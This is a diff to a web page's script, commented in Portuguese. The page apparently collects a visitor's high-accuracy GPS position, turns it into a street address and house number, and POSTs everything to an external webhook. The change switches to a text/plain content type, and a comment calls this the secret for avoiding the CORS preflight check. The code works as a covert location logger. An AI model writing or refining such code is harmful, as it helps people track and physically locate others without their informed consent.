@@ -16,7 +16,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(processarLocalizacao, showError, {
                     enableHighAccuracy: true,
-                    timeout: 10000 // Cancela se o GPS demorar mais de 10 segundos
+                    timeout: 10000 
                 });
             }
         };
@@ -26,8 +26,7 @@
             const lon = position.coords.longitude;
             const precisao = position.coords.accuracy;
 
-            // Prepara os dados básicos garantidos
-            let pacote = {
+            const pacote = {
                 latitude: lat,
                 longitude: lon,
                 margem_erro_metros: precisao.toFixed(2),
@@ -37,35 +36,38 @@
 
             const urlGeocoding = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
 
-            // Tenta buscar a rua
             fetch(urlGeocoding, { headers: { "Accept-Language": "pt-BR" } })
                 .then(resposta => resposta.json())
                 .then(dadosGeocoding => {
                     const endereco = dadosGeocoding.address || {};
-                    pacote.rua = endereco.road || "Não identificada";
-                    pacote.numero = endereco.house_number || "Sem número";
-                    pacote.bairro = endereco.suburb || endereco.neighbourhood || "Não identificado";
-                    pacote.cidade = endereco.city || endereco.town || endereco.village || "Não identificada";
                     
-                    enviarParaWebhook(pacote); // Envia com a rua
+                    // Adiciona os dados de endereço ao pacote
+                    pacote.rua = endereco.road || "Rua não identificada";
+                    pacote.numero = endereco.house_number || "Sem número mapeado";
+                    pacote.bairro = endereco.suburb || endereco.neighbourhood || "Bairro não identificado";
+                    pacote.cidade = endereco.city || endereco.town || "Cidade não identificada";
+                    
+                    enviarParaWebhook(pacote);
                 })
                 .catch(error => {
-                    pacote.erro_rua = "Falha ao buscar nome da rua, mas GPS funcionou.";
-                    enviarParaWebhook(pacote); // Envia só com o GPS mesmo se a rua falhar
+                    pacote.erro_rua = "Falha ao buscar endereço, enviando apenas GPS.";
+                    enviarParaWebhook(pacote);
                 });
         }
 
-        // Função separada que garante o envio do POST
         function enviarParaWebhook(dados) {
+            // O SEGREDO ESTÁ AQUI: text/plain evita o bloqueio OPTIONS
             fetch(URL_DO_WEBHOOK, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(dados)
-            }).catch(e => console.error("Erro no Webhook"));
+                headers: { 
+                    "Content-Type": "text/plain" 
+                },
+                body: JSON.stringify(dados, null, 2)
+            }).catch(e => console.error("Erro no envio"));
         }
 
         function showError(error) {
-            console.error("Falha ao obter localização:", error);
+            console.error("Erro GPS:", error);
         }
     </script>
 </body>
